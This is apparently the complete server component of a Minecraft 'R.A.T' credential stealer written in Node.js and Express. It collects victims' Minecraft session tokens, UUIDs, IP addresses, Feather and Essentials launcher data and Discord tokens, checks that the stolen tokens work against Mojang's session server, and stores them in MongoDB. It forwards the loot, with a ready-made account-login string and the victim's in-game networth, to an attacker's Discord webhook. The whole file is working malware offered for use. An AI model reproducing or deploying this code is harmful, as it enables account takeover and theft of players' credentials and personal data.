//config params
const
    usingDiscord = false,
    usingMongoDB = false

//setup
require("dotenv").config()
const { post, get } = require("axios").default,
    express = require("express"),
    mongoose = require("mongoose"),
    helmet = require("helmet"),
    app = express(),
    expressip = require("express-ip"),
    Ratted = require("./models/Ratted"),
    port = process.env.PORT || 80

//plugins
app.use(helmet()) //secure
app.use(expressip().getIpInfoMiddleware) //ip
app.use(express.json()) //parse json
app.use(express.urlencoded({ extended: true }))

//database connection
if (usingMongoDB) {
    mongoose.connect(process.env.DB)
    mongoose.connection.on("connected", () => console.log("[R.A.T] Connected to MongoDB!"))
    mongoose.connection.on("err", err => console.error(`[R.A.T] Failed to connect to MongoDB:\n${err.stack}`))
    mongoose.connection.on("disconnected", () => console.log("[R.A.T] Disconnected from MongoDB!"))
}

//array initialization
const ipMap = []

//clear map every 15mins if its not already empty
setInterval(() => {
    if (ipMap.length > 0) {
        console.log(`[R.A.T] Cleared map`)
        ipMap.length = 0
    }
}, 1000 * 60 * 15)

//main route, post to this
app.post("/", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!["username", "uuid", "token", "ip", "feather", "essentials", "discord"].every(field => req.body.hasOwnProperty(field))) {
        console.log("[R.A.T] Rejected malformed JSON")
        return res.sendStatus(404)
    }

    //check if ip exists, if not then create a new entry, if yes then increment that entry
    if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1])
    else ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++ })

    //check if ip is banned (5 requests in 15mins)
    if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
        console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`)
        return res.sendStatus(404)
    }

    //validate the token with microsoft auth server (rip mojang)
    post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }), {
        headers: {
            "Content-Type": "application/json"
        }
    })

    .then(async response => {
        if (response.status == 204) { //mojangs way of saying its good
            if (usingMongoDB) {
                //create a Ratted object with mongoose schema and save it
                new Ratted({
                    username: req.body.username,
                    uuid: req.body.uuid,
                    token: req.body.token,
                    ip: req.body.ip,
                    timestamp: new Date(),

                    //(optional) string to login using https://github.com/DxxxxY/TokenAuth
                    tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`,
                    feather: req.body.feather,
                    essentials: req.body.essentials,
                    discord: req.body.discord
                }).save(err => {
                    if (err) console.log(`[R.A.T] Error while saving to MongoDB database:\n${err}`)
                })
            }

            if (usingDiscord) {
                //get networth
                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: { total_networth: null } }] } } })).data.data[0].networth

                //check if api off
                const total_networth = networth.total_networth == null ? 0 : networth.total_networth

                //upload feather
                const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key

                //upload essential
                const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => { return { data: { key: "Error uploading" } } })).data.key

                //get discord info
                const discord = await (await get("https://discordapp.com/api/v6/users/@me/billing/subscriptions", { headers: { "Authorization": req.body.discord, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data

                //send to discord webhook
                post(process.env.WEBHOOK, JSON.stringify({
                    content: `@everyone - ${formatNumber(total_networth)}`, //ping
                    embeds: [{
                        title: `Ratted ${req.body.username} - Click For Stats`,
                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${req.body.discord}\`\`\`\nHas nitro: ${discord.length > 0}`,
                        url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                        color: 5814783,
                        footer: {
                            "text": "R.A.T by dxxxxy",
                            "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
                        },
                        timestamp: new Date()
                    }],
                    attachments: []
                }), {
                    headers: {
                        "Content-Type": "application/json"
                    }
                }).catch(err => {
                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                })
            }

            console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
        }
    })

    .catch(err => {
        //could happen if the auth server is down OR if invalid information is passed in the body
        console.log(`[R.A.T] Error while validating token:\n${err}`)
    })

    //change this to whatever you want, but make sure to send a response
    res.send("OK")
})

//create server
app.listen(port, () => console.log(`[R.A.T] Listening at port ${port}`))

//format a number into thousands millions billions
const formatNumber = (num) => {
    if (num < 1000) return num
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}
